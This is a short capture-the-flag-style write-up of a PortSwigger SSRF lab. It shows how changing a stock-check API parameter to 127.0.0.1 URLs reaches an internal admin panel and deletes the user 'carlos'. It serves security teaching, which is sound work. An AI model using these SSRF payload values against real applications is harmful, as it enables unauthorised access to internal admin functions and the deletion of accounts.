# Lab Writeup: Basic SSRF against the local server

URL: https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-common-ssrf-attacks/ssrf/lab-basic-ssrf-against-localhost#

## Description

This lab has a stock check feature which fetches data from an internal system.

To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.

## Solution

1. View details on one of the objects in homepage
2. Click on "check stock" to do POST request against an API then send the request to burp repeater
3. Change the `stockApi` value to `http://127.0.0.1` then you'll see a link to the admin page

   ```
   <section class="top-links">
       <a href=/>Home</a><p>|</p>
       <a href="/admin">Admin panel</a><p>|</p>
       <a href="/my-account">My account</a><p>|</p>
   </section>
   ```

4. change the `stockApi` value to `http://127.0.0.1/admin` then you'll see a link to delete the user `carlos`

   ```
    <section>
        <p>User deleted successfully!</p>
        <h1>Users</h1>
        <div>
            <span>wiener - </span>
            <a href="/admin/delete?username=wiener">Delete</a>
            <span>carlos - </span>
            <a href="/admin/delete?username=carlos">Delete</a>
        </div>
    </section>
   ```

5. change the `stockApi` value to `http://127.0.0.1/admin/delete?username=carlos` then `carlos` will be deleted and the lab is solved

   ![Basic Local SSRF](/assets/basic-local-ssrf.png)
